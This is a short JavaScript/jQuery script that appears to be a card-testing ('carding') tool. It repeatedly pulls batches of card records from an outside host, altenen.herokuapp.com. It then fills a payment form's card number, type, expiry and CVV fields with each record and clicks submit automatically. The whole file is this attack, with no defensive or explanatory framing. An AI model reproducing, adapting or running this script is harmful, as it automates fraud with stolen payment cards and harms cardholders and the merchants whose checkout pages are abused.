var postUrl = "https://altenen.herokuapp.com/post";
var iteration = null;
var options = {
     url:postUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
	var i = 0;
        var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );

	    $("#card_number").val(json.card);

            $("#card_type_00" + (json.card[0] == 4 ? "1" : "2") ).attr('checked', 'checked');;

	    $("#card_expiry_month").val(json.mon);
            $("#card_expiry_year").val("20" + json.year);
	    $("#card_cvn").val(json.cvv);
	    $("input[type=submit]").click();
	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
$.ajax(options)
.success(cards);s